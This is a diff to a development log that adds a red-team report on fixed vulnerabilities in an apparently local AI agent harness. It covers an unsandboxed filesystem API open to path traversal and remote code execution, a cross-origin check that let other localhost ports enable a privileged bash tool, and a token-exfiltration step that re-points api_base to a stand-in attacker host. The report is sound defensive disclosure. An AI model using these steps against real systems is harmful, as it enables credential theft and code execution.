@@ -733,3 +733,52 @@ console showed `SyntaxError`. `app_js_security_wiring_is_present_exactly_once`
 now pins the spliced structure and the endpoints it must call.
 
 Current status: **239 unit + 90 integration, all green.**
+
+## Round 9 red-team report - APPLIED (`2b53667`, `355c256`)
+
+Two CRITICAL, three HIGH. Both CRITICALs were verified live by the reviewer before
+the fix; both now have live-verified regression tests.
+
+### C1 (CRITICAL) - `/api/filesystem/*` had no sandbox at all (`2b53667`)
+All four endpoints accepted any absolute path: a caller listed
+`C:\Windows\System32\drivers\etc`, and created, renamed and deleted files via `..`
+traversal, tokenless on loopback. Only a drive root and `%USERPROFILE%` were
+refused. Arbitrary read/list/write/delete as the user, and a planted
+`Startup\*.cmd` is immediate RCE. All four are confined to `fs_allowed_roots` (the
+sandbox + approved roots + the active session's project), checked **after
+canonicalization** - which is what makes it hold, since `..\..`, a trailing dot, a
+junction and `\\?\C:\foo` all resolve to the same real path.
+
+### C2 (CRITICAL) - my own cross-origin guard accepted `same-site` (`2b53667`)
+`cross_origin_state_change` let `Sec-Fetch-Site: same-site` through, and for a
+localhost app EVERY other localhost port is same-site (ports are not part of a
+site). A page on any other port flipped `POST /api/security/privileged-shell` to
+true - registering the uncontained `bash` tool - while the identical request
+WITHOUT the header was correctly 403'd. Only `same-origin` is acceptable now.
+
+### H2 (HIGH) - a clean credential-exfiltration primitive (`355c256`)
+`restore_secrets` re-attaches the REAL `api_key` whenever the client echoes the
+`__harness_redacted__` placeholder, so re-pointing an endpoint through a
+whole-config snapshot shipped the stored bearer token to the attacker on the very
+next model call: GET the config (key comes back as a placeholder), POST it back
+with `api_base: http://attacker.tld/v1`, done. `api_base`, `custom_providers`,
+`servers`, `mcp_servers`, `search`, `skills_dirs`, `automations`, `db_path`,
+`host`, `port` and `max_active_subagents` are server-owned now; every
+credential-bearing one already has its own dedicated mutating endpoint, so
+changing a provider's endpoint now requires a NEW explicit key rather than a
+re-point of an existing one. The deliberately client-editable fields (memory,
+output caps, verbosity) stay writable - none carries a secret.
+
+### H3 (HIGH) - the operator's flags were a no-op (`355c256`)
+`--remote-allow` / `--update-pin` were dropped whenever a DB config existed (the
+row replaced the whole config and neither was in `OPERATOR_OVERRIDE_FIELDS`). Since
+the allowlist is also server-owned through the API, there was no way back at all:
+an over-broad entry could never be removed. Both are operator-override fields now,
+and the allowlist unions rather than replaces.
+
+**Also repaired:** the earlier PowerShell re-encode had mangled six folder-picker
+icons (📁 🚀 🏠 📥 🖥️ 📄) into Latin-1 mojibake. All six are byte-correct again.
+
+Current status: **241 unit + 93 integration, all green.**
+
+## Round 9 QA / e2e reports - still landing
